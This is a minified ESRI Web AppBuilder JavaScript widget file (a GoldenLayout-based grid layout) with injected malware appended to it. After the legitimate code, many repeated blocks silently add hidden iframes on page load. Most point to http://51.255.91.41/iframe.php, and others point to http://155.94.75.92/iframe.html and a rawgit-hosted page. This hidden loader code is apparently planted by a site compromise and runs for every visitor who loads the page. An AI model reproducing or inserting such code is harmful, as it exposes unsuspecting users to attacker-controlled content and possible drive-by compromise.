// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define("dojo/_base/declare dojo/_base/lang dojo/_base/array dijit/_WidgetBase dojo/dom-geometry dojo/dom-class dojo/Evented dojo/debounce".split(" "),function(m,c,g,n,p,l,q,r){return m([n,q],{baseClass:"jimu-dijit-gridlayout",declaredClass:"jimu.dijit.GridLayout",container:null,layoutDefinition:null,components:null,editable:!1,_layout:null,_coordinates:null,postCreate:function(){this.inherited(arguments);this._coordinates={};var a={settings:{hasHeaders:!1,resizeEnabled:this.editable,reorderEnabled:this.editable,
selectionEnabled:this.editable},dimensions:{borderWidth:1,dragProxyWidth:0,dragProxyHeight:0},content:this.layoutDefinition};require(["libs/goldenlayout/goldenlayout"],c.hitch(this,function(f){this._layout=new f(a,this.container);this._layout.registerComponent("jimu grid",c.hitch(this,function(a,e){var b;a.parent.config.id=e.id;g.some(this.components,function(d){if(d.id===e.id)return b=d.dijit,a.getElement().html(d.dijit.domNode),!0},this);a.on("resize",r(c.hitch(this,function(){0<a.width&&0<a.height&&
b&&"function"===typeof b.resize&&b.resize(a.width,a.height)}),200));a.on("select",c.hitch(this,function(){this.editable&&a.parent.select();this.emit("mask-click",a.parent.config.id)}))}));this._layout.on("initialised",c.hitch(this,function(){this._resetCoordinate();this.emit("initialised")}));this._layout.on("stateChanged",c.hitch(this,function(){this._resetCoordinate()}));this._layout.init();this.editable||l.add(this._layout.root.childElementContainer[0],"viewonly");l.add(this._layout.root.childElementContainer[0],
"jimu-dijit-gridlayout");setTimeout(c.hitch(this,this.resize),100)}))},destroy:function(){g.forEach(this.components,function(a){a.dijit.destroy()});this._layout.destroy();this.inherited(arguments)},getLayoutDefinition:function(){return this._layout.toConfig().content},resize:function(){var a=p.getMarginBox(this.container);this._layout.updateSize(a.w,a.h)},getComponentSize:function(a){return(a=this._layout.root.contentItems[0].getItemsById(a))&&0<a.length?(a=a[0].container,{w:a.width,h:a.height}):
{w:0,h:0}},getSize:function(){return{w:this._layout.width,h:this._layout.height}},setVisible:function(a,f){var b=this._layout.root.contentItems[0].getItemsById(a);b&&0<b.length&&!1===f?this._hideComponent(b[0]):b&&0!==b.length||!0!==f||this._showComponent(a)},_hideComponent:function(a){a.parent&&a.parent.removeChild(a,!0)},_showComponent:function(a){var f,b,e,c,d,h,k;g.some(this.components,function(b){if(b.id===a)return f=b,!0},this);f&&(c={id:a,type:"component",componentName:"jimu grid",componentState:{id:a}},
b=this._coordinates[a],d=this._layout.root,b?(b[0].type!==d.contentItems[0].type&&(h=d.contentItems[0],d.replaceChild(h,{type:b[0].type,content:[]}),d.contentItems[0].addChild(h)),e=d,g.forEach(b,function(a){k=a.index<=e.contentItems.length?a.index:e.contentItems.length;"component"===a.type?e.addChild(c,k):("stack"!==a.type&&e.contentItems[a.index].type===a.type||e.addChild({type:a.type,content:[]},k),e=e.contentItems[k])},this)):("stack"===d.contentItems[0].type&&(h=d.contentItems[0],d.replaceChild(h,
{type:"column",content:[]}),d.contentItems[0].addChild(h)),d.contentItems[0].addChild(c)))},_resetCoordinate:function(){var a=this._layout.root.getItemsByType("component"),c=function(a,e){var b=a.parent;b&&(g.some(b.contentItems,function(b,c){if(b===a)return e.push({type:b.type,index:c}),!0}),c(b,e))};g.forEach(a,function(a){var b=[];c(a,b);this._coordinates[a.config.id]=b.reverse()},this)}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});